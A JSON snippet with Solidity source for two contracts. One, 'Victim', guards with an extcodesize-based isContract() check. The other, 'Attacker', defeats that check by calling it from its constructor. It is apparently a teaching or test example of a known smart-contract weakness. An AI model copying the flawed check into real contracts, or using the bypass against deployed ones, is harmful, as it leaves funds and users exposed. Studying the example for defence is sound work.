  "source": "pragma solidity 0.5.16;\n\ncontract Victim {\n    function isContract() public view returns(bool){\n      uint32 size;\n      address a = msg.sender;\n      assembly {\n        size := extcodesize(a)\n      }\n      return (size > 0);\n    }\n}\ncontract Attacker {\n    bool public iTrickedIt;\n    Victim v;\n    constructor(address _v) public {\n        v = Victim(_v);\n        \n        iTrickedIt = !v.isContract();\n    }\n}",
